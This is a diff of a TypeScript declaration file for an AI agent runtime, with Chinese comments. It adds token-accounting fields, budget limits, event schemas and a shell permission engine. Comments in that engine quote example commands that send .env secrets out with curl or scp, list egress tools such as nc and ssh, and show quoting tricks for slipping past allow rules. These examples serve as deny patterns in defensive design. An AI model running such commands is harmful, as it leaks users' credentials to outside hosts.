@@ -879,6 +879,8 @@ declare const IRUsageSchema: z.ZodObject<{
     outputTokens: z.ZodNumber;
     cacheReadInputTokens: z.ZodOptional<z.ZodNumber>;
     cacheCreationInputTokens: z.ZodOptional<z.ZodNumber>;
+    /** 思考 / 推理输出量(单列上报者填;缺省不落键)。与 outputTokens 的包含关系不由本键自述,由能力位
+     *  quirks.reasoningTokens 声明(RFC-RF-3;未声明按子集);适配器恒原样透传,消费方按能力位决定是否叠加 */
     reasoningOutputTokens: z.ZodOptional<z.ZodNumber>;
     /**
      * 缓存删除量(contract-v0.4;cached microcompact):
@@ -1233,6 +1235,8 @@ declare const IRStreamEventSchema: z.ZodDiscriminatedUnion<"t", [z.ZodObject<{
         outputTokens: z.ZodNumber;
         cacheReadInputTokens: z.ZodOptional<z.ZodNumber>;
         cacheCreationInputTokens: z.ZodOptional<z.ZodNumber>;
+        /** 思考 / 推理输出量(单列上报者填;缺省不落键)。与 outputTokens 的包含关系不由本键自述,由能力位
+         *  quirks.reasoningTokens 声明(RFC-RF-3;未声明按子集);适配器恒原样透传,消费方按能力位决定是否叠加 */
         reasoningOutputTokens: z.ZodOptional<z.ZodNumber>;
         /**
          * 缓存删除量(contract-v0.4;cached microcompact):
@@ -1657,6 +1661,44 @@ declare const EventBodySchema: z.ZodDiscriminatedUnion<"type", [z.ZodObject<{
     type: "session.cwd_changed";
     from: string;
     to: string;
+}>, z.ZodObject<{
+    type: z.ZodLiteral<"session.events_dropped">;
+    /** 累计丢弃条数(≥1;重复溢出只更新累计) */
+    droppedCount: z.ZodNumber;
+    /** 最近一次触发的上界 */
+    reason: z.ZodEnum<["count_limit", "bytes_limit"]>;
+    /** 丢弃发生的队列归属;词表首值 'sdk.events',自由文本兜底(扩词不 bump) */
+    scope: z.ZodString;
+    /** 累计丢弃近似度量(签发方有账才填) */
+    droppedBytes: z.ZodOptional<z.ZodNumber>;
+    /** 首条被丢事件的 seq */
+    firstDroppedSeq: z.ZodOptional<z.ZodNumber>;
+    /** 末条被丢事件的 seq(≥ firstDroppedSeq) */
+    lastDroppedSeq: z.ZodOptional<z.ZodNumber>;
+    /** 生效条数上界(Infinity 不可 JSON 化 → 缺席 = 不限) */
+    maxEvents: z.ZodOptional<z.ZodNumber>;
+    /** 生效近似度量上界(同上) */
+    maxBytes: z.ZodOptional<z.ZodNumber>;
+}, "strip", z.ZodTypeAny, {
+    type: "session.events_dropped";
+    droppedCount: number;
+    reason: "count_limit" | "bytes_limit";
+    scope: string;
+    droppedBytes?: number | undefined;
+    firstDroppedSeq?: number | undefined;
+    lastDroppedSeq?: number | undefined;
+    maxEvents?: number | undefined;
+    maxBytes?: number | undefined;
+}, {
+    type: "session.events_dropped";
+    droppedCount: number;
+    reason: "count_limit" | "bytes_limit";
+    scope: string;
+    droppedBytes?: number | undefined;
+    firstDroppedSeq?: number | undefined;
+    lastDroppedSeq?: number | undefined;
+    maxEvents?: number | undefined;
+    maxBytes?: number | undefined;
 }>, z.ZodObject<{
     type: z.ZodLiteral<"session.ended">;
 }, "strip", z.ZodTypeAny, {
@@ -2668,6 +2710,44 @@ declare const KernelEventSchema: z.ZodIntersection<z.ZodObject<{
     from: string;
     to: string;
 }>, z.ZodObject<{
+    type: z.ZodLiteral<"session.events_dropped">;
+    /** 累计丢弃条数(≥1;重复溢出只更新累计) */
+    droppedCount: z.ZodNumber;
+    /** 最近一次触发的上界 */
+    reason: z.ZodEnum<["count_limit", "bytes_limit"]>;
+    /** 丢弃发生的队列归属;词表首值 'sdk.events',自由文本兜底(扩词不 bump) */
+    scope: z.ZodString;
+    /** 累计丢弃近似度量(签发方有账才填) */
+    droppedBytes: z.ZodOptional<z.ZodNumber>;
+    /** 首条被丢事件的 seq */
+    firstDroppedSeq: z.ZodOptional<z.ZodNumber>;
+    /** 末条被丢事件的 seq(≥ firstDroppedSeq) */
+    lastDroppedSeq: z.ZodOptional<z.ZodNumber>;
+    /** 生效条数上界(Infinity 不可 JSON 化 → 缺席 = 不限) */
+    maxEvents: z.ZodOptional<z.ZodNumber>;
+    /** 生效近似度量上界(同上) */
+    maxBytes: z.ZodOptional<z.ZodNumber>;
+}, "strip", z.ZodTypeAny, {
+    type: "session.events_dropped";
+    droppedCount: number;
+    reason: "count_limit" | "bytes_limit";
+    scope: string;
+    droppedBytes?: number | undefined;
+    firstDroppedSeq?: number | undefined;
+    lastDroppedSeq?: number | undefined;
+    maxEvents?: number | undefined;
+    maxBytes?: number | undefined;
+}, {
+    type: "session.events_dropped";
+    droppedCount: number;
+    reason: "count_limit" | "bytes_limit";
+    scope: string;
+    droppedBytes?: number | undefined;
+    firstDroppedSeq?: number | undefined;
+    lastDroppedSeq?: number | undefined;
+    maxEvents?: number | undefined;
+    maxBytes?: number | undefined;
+}>, z.ZodObject<{
     type: z.ZodLiteral<"session.ended">;
 }, "strip", z.ZodTypeAny, {
     type: "session.ended";
@@ -3495,7 +3575,13 @@ declare const IntegritySchema: z.ZodObject<{
 }>;
 /** 记录完整性字段(IntegritySchema 推导)。 */
 type Integrity = z.infer<typeof IntegritySchema>;
-/** 日志记录种类词表:用户输入、助手消息、工具结果、事件、队列入 / 确认、压缩边界、分叉、文件检查点。 */
+/**
+ * 日志记录种类词表:用户输入、助手消息、工具结果、事件、队列入 / 确认、压缩边界、分叉、文件检查点。
+ *
+ * 兼容规则(RFC-RF-2 版本门 C,DEC-RF-20;与 events.ts「消费端必须容忍未知事件 type」对偶):
+ * 读者必须容忍未知 kind(`visibility.model=false` 者留档跳过并告警;`=true` 者拒读)。
+ * 「容忍 ≠ 丢弃」:未知 kind 记录留在 records 原位、参与哈希链校验、游标可落其上;仅不进 messages。
+ */
 declare const JournalKindSchema: z.ZodEnum<["user_prompt", "assistant_message", "tool_result", "event", "queue_enqueue", "queue_ack", "compact_boundary", "fork", "file_checkpoint"]>;
 /** 日志记录种类(JournalKindSchema 推导)。 */
 type JournalKind = z.infer<typeof JournalKindSchema>;
@@ -3837,6 +3923,11 @@ declare const CapabilitySchema: z.ZodObject<{
         /** max_tokens 限额是否不含 reasoning 预算(doubao true 与 kimi/glm false
          *  相反实证;成本预估与截断防御的消费点) */
         maxTokensExcludesReasoning: z.ZodOptional<z.ZodBoolean>;
+        /** 思考 token 记账轴(contract-v0.27 RFC-RF-3;与 maxTokensExcludesReasoning 限额轴正交):
+         *  subset_of_output = 思考量已含在 outputTokens 内(OpenAI *_tokens_details 形态,合计不叠加);
+         *  separate = 思考量独立上报(合计须叠加)。可选无默认:undefined = 未实证,消费方按 subset 处置。
+         *  当前无在仓实证,回填须附官方文档引证(URL + 查证日期),不由单例 reasoning ≤ completion 外推 */
+        reasoningTokens: z.ZodOptional<z.ZodEnum<["subset_of_output", "separate"]>>;
     }, "strip", z.ZodTypeAny, {
         unknownModelFallback: boolean;
         claudeModelNameMapping: boolean;
@@ -3847,6 +3938,7 @@ declare const CapabilitySchema: z.ZodObject<{
         modelsEndpoint?: boolean | undefined;
         minTimeoutMs?: number | undefined;
         maxTokensExcludesReasoning?: boolean | undefined;
+        reasoningTokens?: "subset_of_output" | "separate" | undefined;
     }, {
         stopSequences?: "ignored" | "honored" | "misreported_end_turn" | undefined;
         unknownModelFallback?: boolean | undefined;
@@ -3857,6 +3949,7 @@ declare const CapabilitySchema: z.ZodObject<{
         modelsEndpoint?: boolean | undefined;
         minTimeoutMs?: number | undefined;
         maxTokensExcludesReasoning?: boolean | undefined;
+        reasoningTokens?: "subset_of_output" | "separate" | undefined;
     }>>;
     /**
      * contract-v0.4(RFC-B7-2):provider 侧自执行的 hosted 工具单列(如
@@ -3915,6 +4008,7 @@ declare const CapabilitySchema: z.ZodObject<{
         modelsEndpoint?: boolean | undefined;
         minTimeoutMs?: number | undefined;
         maxTokensExcludesReasoning?: boolean | undefined;
+        reasoningTokens?: "subset_of_output" | "separate" | undefined;
     };
     effectiveContext?: number | undefined;
     maxOutput?: number | undefined;
@@ -3973,6 +4067,7 @@ declare const CapabilitySchema: z.ZodObject<{
         modelsEndpoint?: boolean | undefined;
         minTimeoutMs?: number | undefined;
         maxTokensExcludesReasoning?: boolean | undefined;
+        reasoningTokens?: "subset_of_output" | "separate" | undefined;
     } | undefined;
     hostedTools?: string[] | undefined;
     background?: boolean | undefined;
@@ -4257,6 +4352,11 @@ declare const ProviderProfileSchema: z.ZodObject<{
             /** max_tokens 限额是否不含 reasoning 预算(doubao true 与 kimi/glm false
              *  相反实证;成本预估与截断防御的消费点) */
             maxTokensExcludesReasoning: z.ZodOptional<z.ZodBoolean>;
+            /** 思考 token 记账轴(contract-v0.27 RFC-RF-3;与 maxTokensExcludesReasoning 限额轴正交):
+             *  subset_of_output = 思考量已含在 outputTokens 内(OpenAI *_tokens_details 形态,合计不叠加);
+             *  separate = 思考量独立上报(合计须叠加)。可选无默认:undefined = 未实证,消费方按 subset 处置。
+             *  当前无在仓实证,回填须附官方文档引证(URL + 查证日期),不由单例 reasoning ≤ completion 外推 */
+            reasoningTokens: z.ZodOptional<z.ZodEnum<["subset_of_output", "separate"]>>;
         }, "strip", z.ZodTypeAny, {
             unknownModelFallback: boolean;
             claudeModelNameMapping: boolean;
@@ -4267,6 +4367,7 @@ declare const ProviderProfileSchema: z.ZodObject<{
             modelsEndpoint?: boolean | undefined;
             minTimeoutMs?: number | undefined;
             maxTokensExcludesReasoning?: boolean | undefined;
+            reasoningTokens?: "subset_of_output" | "separate" | undefined;
         }, {
             stopSequences?: "ignored" | "honored" | "misreported_end_turn" | undefined;
             unknownModelFallback?: boolean | undefined;
@@ -4277,6 +4378,7 @@ declare const ProviderProfileSchema: z.ZodObject<{
             modelsEndpoint?: boolean | undefined;
             minTimeoutMs?: number | undefined;
             maxTokensExcludesReasoning?: boolean | undefined;
+            reasoningTokens?: "subset_of_output" | "separate" | undefined;
         }>>;
         /**
          * contract-v0.4(RFC-B7-2):provider 侧自执行的 hosted 工具单列(如
@@ -4335,6 +4437,7 @@ declare const ProviderProfileSchema: z.ZodObject<{
             modelsEndpoint?: boolean | undefined;
             minTimeoutMs?: number | undefined;
             maxTokensExcludesReasoning?: boolean | undefined;
+            reasoningTokens?: "subset_of_output" | "separate" | undefined;
         };
         effectiveContext?: number | undefined;
         maxOutput?: number | undefined;
@@ -4393,6 +4496,7 @@ declare const ProviderProfileSchema: z.ZodObject<{
             modelsEndpoint?: boolean | undefined;
             minTimeoutMs?: number | undefined;
             maxTokensExcludesReasoning?: boolean | undefined;
+            reasoningTokens?: "subset_of_output" | "separate" | undefined;
         } | undefined;
         hostedTools?: string[] | undefined;
         background?: boolean | undefined;
@@ -4501,6 +4605,7 @@ declare const ProviderProfileSchema: z.ZodObject<{
             modelsEndpoint?: boolean | undefined;
             minTimeoutMs?: number | undefined;
             maxTokensExcludesReasoning?: boolean | undefined;
+            reasoningTokens?: "subset_of_output" | "separate" | undefined;
         };
         effectiveContext?: number | undefined;
         maxOutput?: number | undefined;
@@ -4579,6 +4684,7 @@ declare const ProviderProfileSchema: z.ZodObject<{
             modelsEndpoint?: boolean | undefined;
             minTimeoutMs?: number | undefined;
             maxTokensExcludesReasoning?: boolean | undefined;
+            reasoningTokens?: "subset_of_output" | "separate" | undefined;
         } | undefined;
         hostedTools?: string[] | undefined;
         background?: boolean | undefined;
@@ -4646,6 +4752,28 @@ type McpServerPoolConfig = NonNullable<z.infer<typeof McpServerGovernanceOptionK
 type McpServerReconnectConfig = NonNullable<z.infer<typeof McpServerGovernanceOptionKeys.reconnect>>;
 declare const PermissionModeSchema: z.ZodEnum<["default", "acceptEdits", "plan", "bypassPermissions", "auto", "dontAsk"]>;
 type PermissionModeName = z.infer<typeof PermissionModeSchema>;
+declare const BudgetSectionSchema: z.ZodObject<{
+    /**
+     * 会话 USD 金额上限(单位:美元)。比对口径 = 成本总账中 USD 币种桶的
+     * 纳元累计(kernel cost/tracker.ts)。如实限界:非 USD 计价(内置价格表
+     * 当前全为 CNY)与缺价模型不进本口径——跨币种不可折算(不编造汇率),
+     * 币种无关的兜底请用 maxTotalTokens。
+     */
+    maxUsd: z.ZodOptional<z.ZodNumber>;
+    /** 会话 token 总量上限(五路 usage 合计:输入+输出+缓存读写+思考) */
+    maxTotalTokens: z.ZodOptional<z.ZodNumber>;
+    /** 超限动作:block=屏障点终止(budget_exceeded);warn=告警一次照常继续 */
+    onExceeded: z.ZodDefault<z.ZodEnum<["block", "warn"]>>;
+}, "strip", z.ZodTypeAny, {
+    onExceeded: "block" | "warn";
+    maxUsd?: number | undefined;
+    maxTotalTokens?: number | undefined;
+}, {
+    maxUsd?: number | undefined;
+    maxTotalTokens?: number | undefined;
+    onExceeded?: "block" | "warn" | undefined;
+}>;
+type BudgetSection = z.infer<typeof BudgetSectionSchema>;
 declare const TansrConfigSchema: z.ZodObject<{
     $schemaVersion: z.ZodDefault<z.ZodLiteral<1>>;
     providers: z.ZodDefault<z.ZodRecord<z.ZodString, z.ZodObject<{
@@ -4870,6 +4998,11 @@ declare const TansrConfigSchema: z.ZodObject<{
                 /** max_tokens 限额是否不含 reasoning 预算(doubao true 与 kimi/glm false
                  *  相反实证;成本预估与截断防御的消费点) */
                 maxTokensExcludesReasoning: z.ZodOptional<z.ZodBoolean>;
+                /** 思考 token 记账轴(contract-v0.27 RFC-RF-3;与 maxTokensExcludesReasoning 限额轴正交):
+                 *  subset_of_output = 思考量已含在 outputTokens 内(OpenAI *_tokens_details 形态,合计不叠加);
+                 *  separate = 思考量独立上报(合计须叠加)。可选无默认:undefined = 未实证,消费方按 subset 处置。
+                 *  当前无在仓实证,回填须附官方文档引证(URL + 查证日期),不由单例 reasoning ≤ completion 外推 */
+                reasoningTokens: z.ZodOptional<z.ZodEnum<["subset_of_output", "separate"]>>;
             }, "strip", z.ZodTypeAny, {
                 unknownModelFallback: boolean;
                 claudeModelNameMapping: boolean;
@@ -4880,6 +5013,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             }, {
                 stopSequences?: "ignored" | "honored" | "misreported_end_turn" | undefined;
                 unknownModelFallback?: boolean | undefined;
@@ -4890,6 +5024,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             }>>;
             /**
              * contract-v0.4(RFC-B7-2):provider 侧自执行的 hosted 工具单列(如
@@ -4948,6 +5083,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             };
             effectiveContext?: number | undefined;
             maxOutput?: number | undefined;
@@ -5006,6 +5142,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -5114,6 +5251,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             };
             effectiveContext?: number | undefined;
             maxOutput?: number | undefined;
@@ -5192,6 +5330,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -6402,6 +6541,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             };
             effectiveContext?: number | undefined;
             maxOutput?: number | undefined;
@@ -6813,6 +6953,7 @@ declare const TansrConfigSchema: z.ZodObject<{
                 modelsEndpoint?: boolean | undefined;
                 minTimeoutMs?: number | undefined;
                 maxTokensExcludesReasoning?: boolean | undefined;
+                reasoningTokens?: "subset_of_output" | "separate" | undefined;
             } | undefined;
             hostedTools?: string[] | undefined;
             background?: boolean | undefined;
@@ -8123,6 +8264,54 @@ interface SpawnLike {
     launch(spec: SpawnSpec): SpawnedProcessLike;
 }
 
+/**
+ * 宿主 shell 事实源(单点)。
+ *
+ * Shell 工具在 win32 上经 `powershell.exe -Command` 执行、其余平台经 `/bin/sh -c`
+ * (executor.ts `buildSpawnPlan`);权限引擎的命令词法必须与执行器实际使用的 shell
+ * 一致(PowerShell:未加引号的 `\` 是路径分隔符而非转义;反引号是转义;`&`/`.`
+ * 是调用 / 点源运算符;`{ }` 是脚本块),否则裁决看到的词与真正执行的词不是同一
+ * 组词。执行器与引擎都从本函数取值,任何一侧不得另写
+ * `process.platform === 'win32'` 分叉。
+ */
+/** 宿主 shell 方言:posix(/bin/sh 系)或 powershell(Windows PowerShell / pwsh) */
+type HostShell = 'posix' | 'powershell';
+
+/**
+ * Shell 命令词法切分与前缀规则匹配(自实现,零第三方依赖)。
+ *
+ * 安全模型(不对称匹配,最严格者胜的落地):
+ * - **allow 侧保守**:只有"字面即所见"的命令才可能命中 allow——
+ *   规则 token 消耗的词必须无引号/转义/展开/通配(防 `"git" push`、`g\it`、
+ *   `$GIT`、`g*t` 冒充);可执行体不得是路径形式(`/usr/bin/git`、`.\git`);
+ *   大小写敏感;段内出现子 shell/重定向/命令替换/heredoc 一律不可 allow。
+ * - **deny/ask 侧激进**:用去引号后的值匹配(`"git" push` 仍会命中 deny
+ *   `git *`);大小写不敏感;可执行体做 basename + 扩展名归一
+ *   (`C:\bin\RM.EXE` → `rm`);迭代剥离环境变量赋值前缀与包装器
+ *   (sudo/env/timeout/xargs 等)后再匹配。
+ * - 词法不可解析(未闭合引号、可疑 Unicode 空白、超长、heredoc)→ 整条
+ *   命令不可 allow,由引擎保守落 ask。
+ *
+ * 宿主 shell 感知:词法按 `hostShell` 选方言,与执行器实际派生的 shell
+ * 一致(tools/shell/host-shell.ts 单一事实源):
+ * - posix(缺省,语义逐字节不变):`\` 转义、反引号命令替换、`&` 后台、`{ }` 普通词;
+ * - powershell:未引号 `\` 是字面路径分隔符;反引号是转义(词非字面、段 unsafe;
+ *   行尾悬空 → 不可解析);`''`/`""` 双写引号;`&`(段首)调用运算符、`.`(段首)点源
+ *   运算符作非字面词并标 unsafe;`{ }` 脚本块——块内命令拆为独立的 nested 段逐条
+ *   参与 deny 判定、块本身 unsafe、不平衡 → 不可解析;`<# #>` 块注释;`@"…"@` here-string;
+ *   保留的 `<` → 不可解析。
+ * - 嵌套载荷(两种方言都做,深度 ≤ MAX_NESTED_DEPTH):`sh/bash -c "<载荷>"`、
+ *   `eval <载荷>`、`powershell -Command <载荷>` / `-EncodedCommand <base64>`、
+ *   `Invoke-Expression <载荷>`、`cmd /c <载荷>` 的载荷按目标 shell 方言再词法化,产出
+ *   nested 段(恒 unsafe,不参与顶层结构树)——任一 nested 段命中 deny 即整条 deny;
+ *   载荷不可解析 → 整条不可解析(bypass 亦只能落 ask,绝不 allow)。
+ *
+ * 规则 specifier 语义(`Shell(git *)`):
+ * - 按空白切词;末尾独立 `*` 表示"其余任意多个词(含零个)";
+ * - 中间独立 `*` 匹配恰好一个词;token 内 `*`/`?` 为 token 级通配;
+ * - 无末尾 `*` 时要求词数精确相等(exact 形态)。
+ */
+
 /** 段间链接符(结构树用;'&' 表示前一段被后台化,'newline' 为换行拆段) */
 type ShellChainOperator = ';' | '&&' | '||' | '&' | '|' | '|&' | 'newline';
 interface ShellRedirect {
@@ -8237,12 +8426,64 @@ interface BaselineRules {
     exceptions: readonly string[];
 }
 
+/**
+ * hard-safety 层(「绝对禁止」红线的可判定子集;INV-2)。
+ *
+ * 定位(处置优先级最高位):引擎管线**第 0 段**,先于 deny 规则、
+ * 先于 bypass——任何 allow / auto / bypass / 分类器 safe / 审批凭证都**不可
+ * 中和**(INV-2)。集合 = 内置 + managed 追加;项目层永不可触(INV-4)。
+ *
+ * 诚实的能力边界(不宣称全量硬保证):绝对禁止面是语义红线,但 shell 内部
+ * 数据流不可全量静态判定。本层只结构化承载**可判定子集**——不可判定部分
+ * 仍进分类器 hard 类目与残余登记。可判定子集 = 两类:
+ *
+ * 1. **同调用秘密外发**(secret.access + network.egress 的组合谓词):
+ *    某个管道内**同时**存在(a)egress 命令(curl/wget/nc/scp/ssh/rsync/
+ *    git push 等)与(b)对秘密面路径的引用(argv 里 `.env`/密钥/凭据,含
+ *    `@file` 上传形态与 `--flag=@file`/`name=@file`)。覆盖两种落地形态:
+ *    · 单命令:`curl -F data=@.env https://x`、`scp .env user@host:`;
+ *    · 管道:`cat .env | curl --data-binary @- https://x`(读秘密的命令与
+ *      egress 命令由 `|` 相连,数据确定流向外发)。
+ *    不可判定形态(变量间接、base64 转义后外发、子 shell 深层拼装)不在此,
+ *    进分类器/残余登记——不假装拦住。
+ *
+ * 2. **审计篡改/删除**(audit.modify 掩盖行为):写改或删除 tansr 审计
+ *    目录内文件——审计的意义在于 agent 不能抹除自己的痕迹,故为 deny 而非
+ *    protected-path 的 ask。覆盖:路径工具(Write/Edit)落审计目录;shell
+ *    侧**默认拒**——审计路径被 argv 引用时仅纯读白名单命令
+ *    (cat/head/grep/Get-Content/…)放行,写语义命令(rm/cp/mv/tee/sed -i/
+ *    dd/Set-Content/Copy-Item/Move-Item/Out-File…)不再逐一枚举,引用即拒;
+ *    写向重定向(`>`/`>>`)落审计目录无条件拒。审计目录 = 配置注入的
+ *    canonical 目录集(managed/装配层)+ 结构默认「`.tansr` 段紧随 `audit`
+ *    段」的任意路径。
+ *
+ * 3. **凭据出线(工具级)**:同一组合谓词(secret.access +
+ *    network.egress)的**工具半边**——Http 工具携 `auth`(bearer / basic / header 任一
+ *    type,引用进程环境变量)向会话内容给出的目的地出线。与 Shell 半边同一份词表
+ *    (EGRESS_TOOL_NAMES / SECRET_BEARING_TOOL_ARGS 两常量,裁决人提示的 `<tool>` 段与
+ *    ask 面文案同源取词),但处置为 **全模式恒 ask**(而非 deny):凭据经 Http 出线是
+ *    BYO 集成的正当用法,红线只在「不得静默放行」——auto / bypass / `allow:['Http']` /
+ *    分类器 safe / 会话缓存 allow 全部压不过;无询问通道(headless / serve / mcp serve /
+ *    dontAsk)由下游地板 deny。任何 deny 终局(配置 deny / plan 拒写 / 基线)不被软化
+ *    (引擎以「非 deny 终局升档为 ask」落地)。ask 理由携带**变量名 + 方法 + 目的地
+ *    origin**(绝不含值),TUI 弹卡 / ACP attribution 既有渲染即显。名单
+ *    (`http.allowedAuthEnvVars`)只决定「哪些变量可用」,不软化本闸。
+ *
+ * 与既有层的关系:protected-paths(4.7 段,ask)对 `.git`/`.tansr` 仍在——
+ * 本层只把其中「秘密外发」「审计抹除」两个不可逆红线**提级为 deny**。
+ *
+ * 零 IO 铁律:本层纯文本判定(命令结构树 + canonical 文本),不解析
+ * 链接、不落盘;真实目标验证由执行边界守卫负责。
+ */
+
 /** hard-safety 追加面(managed/装配层注入;项目层永不可触) */
 interface HardSafetyConfig {
     /** 追加 egress 命令实体(小写 basename) */
     extraEgressCommands?: readonly string[];
     /** 审计目录 canonical 绝对路径集(命中即 audit.modify 面) */
     auditDirs?: readonly string[];
+    /** 宿主 shell 方言(缺省 posix;引擎按 detectHostShell 传入,与执行器实际派生的 shell 一致) */
+    hostShell?: HostShell;
 }
 
 /**
@@ -8322,6 +8563,12 @@ interface PermissionEngineConfig {
      * os.homedir())。仅测试与特殊装配需要注入;与基线同开关。
      */
     homedir?: string;
+    /**
+     * 宿主 shell 方言:Shell 命令词法 / 结构树 / hard-safety / 分类器事实
+     * 所用的方言。缺省 `detectHostShell()`——跟随执行器实际派生的 shell(win32 →
+     * powershell,其余 → posix),引擎与执行器同一事实源;测试或跨平台装配可显式指定。
+     */
+    hostShell?: HostShell;
     /**
      * hard-safety 层追加面(INV-2)。内置子集恒启用、
      * **不受 baseline.enabled 与 disableBaselineProtection 影响**(绝对
@@ -11709,7 +11956,13 @@ type CompactNowRejectReason =
  * PreCompact hook 阻断本次压缩(exit 2 / decision=deny|block)。
  * 显式协议行为而非故障——hook 作者对压缩行使否决权,历史未改动。
  */
- | 'hook_blocked';
+ | 'hook_blocked'
+/**
+ * 消费方已关闭事件迭代器(events.return()/throw(),含 for-await 提前 break)
+ * ——本轮随之取消,不再经过任何屏障点;关闭前排队的悬诺与关闭后的调用皆
+ * 立即以本值拒绝(不悬挂)。与 turn_ended(自然终局)可区分。
+ */
+ | 'query_closed';
 /** compactNow 的结算结果(在下一个屏障点执行后兑现) */
 type CompactNowResult = 
 /** K-5:checkpointId = beforeCompact 钩子落的压缩前快照 id(与 outcome.checkpointId 同值;缺席 = 未落) */
@@ -11726,9 +11979,57 @@ type CompactNowResult =
     status: 'rejected';
     reason: CompactNowRejectReason;
 };
-/** 四计数分离(《07》§1.6 ①:恢复重试必须可观测,不得混进 turn 计数) */
+/**
+ * OPT-03 — 预算闸门的消耗快照(contract-v0.7,RFC-OPT3-2)。
+ * 两个口径都是「会话累计」而非本次查询:预算是会话级约定,多次 runQuery
+ * (TUI 多轮)共享同一账本。
+ */
+interface BudgetSpend {
+    /** USD 币种桶的纳元累计(1e-9 美元;cost/tracker.ts 快照口径)。无 USD 记账恒 0 */
+    usdNano: number;
+    /**
+     * token 合计 = 输入 + 输出 + 缓存读 + 缓存写;思考(reasoning)视为输出的子集
+     * 不叠加(RF-06 / RV-1-02:口径单点 cost/budget-spend.ts `budgetSpendOf`,
+     * 装配层不得自持公式)。provider 明示思考单列(能力位 quirks.reasoningTokens =
+     * 'separate')的行由 CostTracker.record 逐行把思考量并入该行输出(RF-P3a),
+     * 快照恒为正则形,本口径无会话级选项。
+     */
+    totalTokens: number;
+}
+/**
+ * OPT-03 — 预算熔断闸门(contract-v0.7)。闸门只在 assembling 屏障点比对
+ * (不截断流式中/工具执行中——已发出的调用跑完、配对完整落史后才终局):
+ * 任一上限触顶(≥)即超限;onExceeded='block'(缺省)以 turn.aborted/
+ * budget_exceeded 终止,'warn' 每次查询至多告警一次(turn.error scope='budget',
+ * recoverable)后照常继续。getSpend 由装配层闭包接会话 CostTracker;抛错按
+ * 可恢复 turn.error 降级并跳过本屏障比对(闸门失效好过误杀会话)。
+ */
+interface RunQueryBudget {
+    /** USD 上限(美元;比对 spend.usdNano ≥ maxUsd×1e9)。币种限界见 BudgetSpend */
+    maxUsd?: number;
+    /** token 总量上限(比对 spend.totalTokens;币种无关兜底) */
+    maxTotalTokens?: number;
+    /** 缺省 'block' */
+    onExceeded?: 'block' | 'warn';
+    /** 会话累计消耗读取闭包(每个屏障点求值一次) */
+    getSpend: () => BudgetSpend;
+}
+/**
+ * 查询环计数。
+ * - modelTurns       预算口径的模型轮(maxTurns 比对位);
+ * - apiRounds        模型派发总数(恒不退还);
+ * - recoveryAttempts 同轮恢复重试数(恢复重试可观测,不混进预算轮);
+ * - toolRounds       工具轮;
+ * - HTTP 尝试数不在此计数:provider 重试环以错误事件的 retrySummary.attempts
+ *   上报,查询环只汇入终局 turn.error 文案。
+ * 不变量:apiRounds − modelTurns = 被退还的可恢复错误重试数 ≤ recoveryAttempts。
+ */
 interface QueryCounters {
-    /** 模型调用次数(每次进入 streaming +1,重试也计入) */
+    /**
+     * 预算口径的模型轮:每次派发(进入 streaming)+1;**可恢复错误的同轮重试退还**
+     * (零产出零成本,不烧 maxTurns 预算);上下文溢出的压缩重试与输出触帽的
+     * 升档重发不退还(前者已消耗上游请求、后者响应已产出成本)。
+     */
     modelTurns: number;
     /** 工具执行轮次(每批工具 +1) */
     toolRounds: number;
@@ -11742,10 +12043,30 @@ interface QueryCounters {
      * kernel 查询环恒初始化并如实累计。
      */
     outputCapEscalations?: number;
+    /**
+     * 模型派发总数:每次进入 streaming +1,**恒不退还**(与 modelTurns 的差 =
+     * 被退还的可恢复错误重试数)。纯追加可选字段:缺席 = 0(旧消费方 / 测试替身
+     * 零迁移);查询环恒初始化并如实累计。
+     */
+    apiRounds?: number;
+    /**
+     * 同轮恢复重试次数:可恢复错误重发 / 上下文溢出压缩重试 / 输出触帽升档重发
+     * 三类回边各 +1(升档重发同时计入 outputCapEscalations)。纯追加可选字段:
+     * 缺席 = 0;查询环恒初始化并累计。
+     */
+    recoveryAttempts?: number;
 }
 /** runQuery 返回句柄(《07》§1.6 ⑨:排队输入只经 enqueueUserInput 进入屏障) */
 interface QueryHandle {
-    /** 事件流:protocol 完整事件(包络+负载),seq 单调 */
+    /**
+     * 事件流:protocol 完整事件(包络+负载),seq 单调。
+     *
+     * 关闭即取消:消费方调用 `return()` / `throw()`(含 for-await 提前 break)= 走人,
+     * 本轮随之取消——内部信号以 ITERATOR_CLOSED_ABORT_REASON 中止,在飞模型流 /
+     * 工具批经 ctx.signal 见到 abort 提前退出;**不签发终局事件**(消费方已离场);
+     * 状态机在有界步数内进入 terminated,messages() 经配对补齐仍可续会话;
+     * compactNow 悬诺以 query_closed 兑现。终局之后的 return()/throw() 为无害 no-op。
+     */
     events: AsyncGenerator<KernelEvent, void, undefined>;
     /**
      * 等待已经启动的查询及模型/工具生成器真实收尾，不消费事件、不中止。
@@ -11788,7 +12109,8 @@ interface QueryHandle {
